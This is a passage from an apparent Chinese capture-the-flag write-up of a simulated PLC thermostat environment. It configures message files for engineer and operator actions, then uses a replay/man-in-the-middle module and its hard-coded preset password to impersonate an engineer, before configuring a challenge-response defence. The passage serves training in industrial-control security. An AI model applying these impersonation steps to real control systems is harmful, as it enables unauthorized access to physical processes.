	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span>
	<span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span>
	<span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712110019651.png" alt="image-20240712110019651"></p>
<hr>
<h4 id="模拟二进制逻辑上传"><a href="#模拟二进制逻辑上传" class="headerlink" title="模拟二进制逻辑上传"></a>模拟二进制逻辑上传</h4><blockquote>
<p>编辑task_1_1.sh，删除对应任务的sh前面的#号，打开注释行，并在工程师用户目录下编写bin_upload.msg，填写正确的plc逻辑信息，再运行task_1_1.sh,以实现模拟的二进制逻辑上传。</p>
</blockquote>
<p>bin_upload.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span>
	<span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先看一下type对应的枚举类型：</p>
<p>文件类型定义<code>emu_plc_file_type</code>（位于PLC模拟操作的plc_emu.json）</p>
<table>
<thead>
<tr>
<th>枚举项名称</th>
<th>枚举数值</th>
<th>内容</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>FILE_CODE</td>
<td>0x01</td>
<td>代码文件</td>
<td></td>
</tr>
<tr>
<td>FILE_LOGIC</td>
<td>0x02</td>
<td>PLC逻辑文件</td>
<td>由对应代码文件生成</td>
</tr>
<tr>
<td>FILE_DESC</td>
<td>0x10</td>
<td>描述文件</td>
<td>保留待以后选用</td>
</tr>
<tr>
<td>FILE_RULE</td>
<td>0x20</td>
<td>制度文件</td>
<td>保留待以后选用</td>
</tr>
</tbody></table>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712111831356.png" alt="image-20240712111831356"></p>
<p>修改bin_upload.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"libthermostat_logic.so"</span><span class="token punctuation">,</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_LOGIC"</span><span class="token punctuation">,</span>
	<span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span>
	<span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712120702394.png" alt="image-20240712120702394"></p>
<hr>
<h4 id="模拟PLC逻辑启动"><a href="#模拟PLC逻辑启动" class="headerlink" title="模拟PLC逻辑启动"></a>模拟PLC逻辑启动</h4><blockquote>
<p>编辑task_1_1.sh，打开“启动plc设备模拟”提示后面的注释项，运行task_1_1.sh</p>
</blockquote>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121057598.png" alt="image-20240712121057598"></p>
<p>观察plc设备工作目录instance&#x2F;plc&#x2F;device&#x2F;下的message_log目录，发现其增加了logic_send.log文件</p>
<blockquote>
<p>这里message_log目录记录的是各用例模拟运行的过程，logic_send则是在设备工作目录下配置的系统自动监控流程的模拟业务流</p>
</blockquote>
<p>instance&#x2F;plc&#x2F;device&#x2F;router_policy.cfg</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121529217.png" alt="image-20240712121529217"></p>
<p>主要看下半部分</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"policy_head"</span><span class="token operator">:</span>
	<span class="token punctuation">&#123;</span>
		<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_send"</span><span class="token punctuation">,</span>
       	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"DELIVER"</span><span class="token punctuation">,</span>
        <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>
	<span class="token punctuation">[</span>
		<span class="token punctuation">&#123;</span><span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"OR"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MODBUS_CMD"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token punctuation">]</span><span class="token punctuation">,</span>
	<span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>
	<span class="token punctuation">&#123;</span>
		<span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>
			<span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"device"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
			<span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">&#125;</span>
		<span class="token punctuation">]</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里用消息路由来将多个模块的功能串起来模拟业务流程：</p>
<ul>
<li><p>开头部分描述了<strong>消息路由的名称、类型和起始模块</strong></p>
</li>
<li><p>中间部分表示<strong>当消息在起始模块位置时的格式和内容信息</strong>：</p>
<p>当起始模块生成消息(模块中用<code>message_create</code>函数生成，且最后激活消息参数设为NULL时）与其格式要求一致时（在这里就是消息类型为<code>MODBUS_CMD</code>，用来模拟modbus协议命令)，会被识别为该路由的起始消息</p>
</li>
<li><p>最后部分则说明消息<strong>先后通过device和logic模块</strong>后结束传递：它其实模拟了plc逻辑（用logic模块模拟）发出命令给device,由device处理后返回logic模块的过程</p>
</li>
</ul>
<p>当系统模拟运行时，观察设备工作目录instance&#x2F;plc&#x2F;device中日志目录message_log中的logic_send.msg文件将显示该路由中的信息，由于该过程循环进行，因此可看到大量信息</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122119408.png" alt="image-20240712122119408"></p>
<hr>
<h4 id="模拟操作员登录行为"><a href="#模拟操作员登录行为" class="headerlink" title="模拟操作员登录行为"></a>模拟操作员登录行为</h4><blockquote>
<p>在task_1_1.sh脚本的“启动hacker”提示、“启动操作员站”提示和“执行操作员登录行为”提示后面打开被注释的命令，并编辑操作员用户工作目录下的operator_login.msg，添加操作员用户的名称和口令信息，而后进行试登录。如登录成功，则表明通过该过程。</p>
</blockquote>
<p>instance&#x2F;operator&#x2F;user&#x2F;operator_login.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和工程师登录一样，在<code>return_value</code>添加<code>用户名:口令</code>，用户要选择user.list里<code>&quot;role&quot;:&quot;PLC_OPERATOR&quot;</code>的</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122832291.png" alt="image-20240712122832291"></p>
<hr>
<h4 id="模拟操作员的一组plc操作"><a href="#模拟操作员的一组plc操作" class="headerlink" title="模拟操作员的一组plc操作"></a>模拟操作员的一组plc操作</h4><blockquote>
<p>打开task_1_1.sh最后几条注释掉的命令，然后，修改操作员用户工作目录下的plc_start.msg , plc_read_t.msg和plc_set_t.msg，分别实现打开plc温度调节开关，观察plc当前环境温度以及将plc恒温温度设置为39度（3900）的目标</p>
</blockquote>
<p>instance&#x2F;operator&#x2F;user&#x2F;plc_start.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>instance&#x2F;operator&#x2F;user&#x2F;plc_read_t.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>instance&#x2F;operator&#x2F;user&#x2F;plc_set_t.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看一下<code>(PLC_OPERATOR,PLC_CMD)</code>数据结构的定义：</p>
<table>
<thead>
<tr>
<th>元素名称</th>
<th>元素类型</th>
<th>元素大小</th>
<th>信息内容</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>plc_devname</td>
<td>0结尾字符串</td>
<td>&lt;&#x3D;32字节</td>
<td>设备的名称</td>
<td></td>
</tr>
<tr>
<td>action</td>
<td>ENUM</td>
<td>4字节</td>
<td>操作员的行为</td>
<td>使用enum_plc_operator_action</td>
</tr>
<tr>
<td>action_desc</td>
<td>0结尾字符串</td>
<td>&lt;&#x3D;32字节</td>
<td>操作员行为描述</td>
<td><strong>使用寄存器名称进行描述</strong></td>
</tr>
<tr>
<td>value</td>
<td>INT</td>
<td>4字节</td>
<td>寄存器设置的值</td>
<td></td>
</tr>
<tr>
<td>plc_operator</td>
<td>0结尾字符串</td>
<td>&lt;&#x3D;32字节</td>
<td>操作者的名称</td>
<td></td>
</tr>
<tr>
<td>time</td>
<td>INT</td>
<td>4字节</td>
<td>操作时间</td>
<td></td>
</tr>
</tbody></table>
<p>看一下操作员操作类型定义 <code>enum_plc_operator_action</code>（位于plc_emu.json）</p>
<table>
<thead>
<tr>
<th>枚举项名称</th>
<th>枚举数值</th>
<th>内容</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>ACTION_ON</td>
<td>0x01</td>
<td>开启操作</td>
<td></td>
</tr>
<tr>
<td>ACTION_OFF</td>
<td>0x02</td>
<td>关闭操作</td>
<td></td>
</tr>
<tr>
<td>ACTION_MONITOR</td>
<td>0x03</td>
<td>监视操作</td>
<td>读取寄存器信息</td>
</tr>
<tr>
<td>ACTION_ADJUST</td>
<td>0x04</td>
<td>设置操作</td>
<td>调节恒温设置、档位设置</td>
</tr>
</tbody></table>
<p>再看一下PLC设备寄存器设计：</p>
<table>
<thead>
<tr>
<th>寄存器名称</th>
<th>寄存器类型</th>
<th>寄存器地址</th>
<th>寄存器内容</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>device_S</td>
<td>coil</td>
<td>1</td>
<td>恒温箱开关</td>
<td>0为关闭，1为启动</td>
</tr>
<tr>
<td>set_T</td>
<td>Holding Registers</td>
<td>40003</td>
<td>恒温数值要求</td>
<td>短整型</td>
</tr>
<tr>
<td>curr_T</td>
<td>Input Registers</td>
<td>30004</td>
<td>恒温箱当前温度</td>
<td>短整型</td>
</tr>
<tr>
<td>heating_S</td>
<td>Coil</td>
<td>2</td>
<td>电热丝开关</td>
<td>0为关，1为制热</td>
</tr>
<tr>
<td>heating_G</td>
<td>Holding Registers</td>
<td>40005</td>
<td>电流档位</td>
<td>0-9档</td>
</tr>
</tbody></table>
<p>修改plc_start.msg，打开plc温度调节开关（这里最逆天的是要开的是电热丝）</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"heating_S"</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改plc_read_t.msg，观察plc当前环境温度</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"curr_T"</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改plc_set_t.msg，将plc恒温温度设置为39度（3900）</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712204232928.png" alt="image-20240712204232928"></p>
<hr>
<h3 id="身份认证安全测试"><a href="#身份认证安全测试" class="headerlink" title="身份认证安全测试"></a>身份认证安全测试</h3><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><blockquote>
<p>系统在工程师站engineer_station和管理中心center之间插入了一个<code>login_hacker</code><strong>实例</strong>，用该实例来模拟攻击行为。当前实例中使用了一个<code>echo_plugin</code><strong>模块</strong>，该模块只是简单地转发收到的消息，不会产生攻击行为。</p>
</blockquote>
<blockquote>
<p>某攻击者开发了一个<strong>重放攻击模块</strong><code>login_hacker</code>,该模块可以<strong>记录登录用户的名称与所使用的认证口令</strong>，如果攻击者使用登录过的用户名进行登录，并且在口令处使用攻击者预设的口令，则模块将自动使用以前记录的口令进行登录。</p>
</blockquote>
<blockquote>
<p>请用login_hacker模块替换echo_plugin模块，并且正确填写工程师用户目录下的engineer_login_nopass.msg，使攻击者可以在没有工程师用户口令的情况下在工程师站仿冒工程师进行登录。</p>
</blockquote>
<p>cube架构的实例将准备使用的模块列在plugin_config.cfg文件中，每个选用的模块都有两个名字：</p>
<ul>
<li><p>name表示实例中该模块的名称，在定义路由时使用这个名字，这个名字一般与模块在实例中的使用方式相关。</p>
</li>
<li><p>libname则是该模块开发时使用的名字，这个名字一般表现了开发者对其的定位。这里<code>echo_plugin</code>和<code>login_hacker</code>都是libname</p>
</li>
</ul>
<p>因为<code>task_1_2.sh</code>中的运行命令为：<code>yes | cp -a instance/login_hacker/plugin_config.cfg.task_1_2 instance/login_hacker/plugin_config.cfg </code>，所以我们只需要修改 plugin_config.cfg.task_1_2 的 libname 即可</p>
<p>修改后的plugin_config.cfg.task_1_2：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<blockquote>
<p>login_hacker模块的源码在 2024buildup&#x2F;src&#x2F;security 下面的某个同名目录中，以c语言编写，阅读其源码，可以找到所用的预设口令</p>
</blockquote>
<p>src&#x2F;security&#x2F;login_hacker&#x2F;login_hacker.c</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712164109641.png" alt="image-20240712164109641"></p>
<p>可知口令在这里是<code>static char security_pass[32] = &quot;Tclab2024&quot;;</code>，即<code>Tclab2024</code></p>
<p>拿到口令之后，修改 instance&#x2F;engineer&#x2F;user&#x2F;engineer_login_nopass.msg，在口令处使用攻击者预设的口令</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:Tclab2024"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>验证：</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712170232030.png" alt="image-20240712170232030"></p>
<p>可以看到第二次的时候成功登录</p>
<br>

<p>此外，也可以顺便了解下cube架构中模块的逻辑。cube架构的模块其结构比较清晰：</p>
<ul>
<li><p>一般用<code>一个模块名+init的函数（称为模块的init函数）</code>进行模块载入时的<strong>初始化操作</strong></p>
</li>
<li><p>用<code>一个模块名+start的函数（称为模块的start函数）</code>作为模块的<strong>主体</strong>，持续进行循环，每次循环检查模块接收到的消息并进行处理。</p>
<p>start函数根据消息的格式分流消息，让每种消息调用自己的专用操作函数。如果模块的几个处理流程共用同一种消息格式，则一般在消息处理函数中获取消息后，再根据消息内容进行第二次分流，一般而言，每个流程都有自己专门的处理函数</p>
</li>
</ul>
<hr>
<h4 id="挑战-应答机制"><a href="#挑战-应答机制" class="headerlink" title="挑战-应答机制"></a>挑战-应答机制</h4><blockquote>
<p>为了防范中间人攻击，我们准备用挑战-应答机制来替换掉当前使用的口令字符串哈希的认证机制。当前使用的用户端登录处理模块<code>login_user</code>和服务端登录处理模块<code>login_server</code>本身就具备了支持挑战-应答机制的能力。请正确配置参数和路由，实现挑战-应答机制，以防范重放攻击行为</p>
</blockquote>
<p>在 plugin_config.cfg 中定义模块时，可以使用<code>init_para</code>参数来为模块提供一些配置信息</p>
<p>配置信息的定义一般在模块的定义文件cfg中。如 login_user.cfg 中给出了<code>init_para_desc</code>的定义，定义中用mode值来表示模块采用哪一种登录机制。</p>
<p>plugin&#x2F;login_user.cfg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
<span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>
<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span>
<span class="token property">"dynamic_lib"</span><span class="token operator">:</span><span class="token string">"liblogin_user.so"</span><span class="token punctuation">,</span>
<span class="token property">"init"</span><span class="token operator">:</span><span class="token string">"login_user_init"</span><span class="token punctuation">,</span>
<span class="token property">"start"</span><span class="token operator">:</span><span class="token string">"login_user_start"</span><span class="token punctuation">,</span>
<span class="token property">"init_para_desc"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
	<span class="token property">"elem_no"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
	<span class="token property">"elem_desc"</span><span class="token operator">:</span>
		<span class="token punctuation">[</span>
			<span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"mode"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span>
		<span class="token punctuation">]</span>
	<span class="token punctuation">&#125;</span>	
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>plugin模块定义时，可以用<code>&quot;init_para&quot;:&#123;&quot;mode&quot;:1&#125;</code>来表示模块选择了模式1</p>
<blockquote>
<p>请通过阅读源码确定哪种模式是挑战应答模式，并在plugin_config.cfg中正确配置</p>
</blockquote>
<p>直接全局搜索找到相关的代码</p>
<p>src&#x2F;system&#x2F;login_user&#x2F;login_user.c</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712174924813.png" alt="image-20240712174924813"></p>
<p>可知是模式2，那么plugin_config.cfg.task_1_3：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
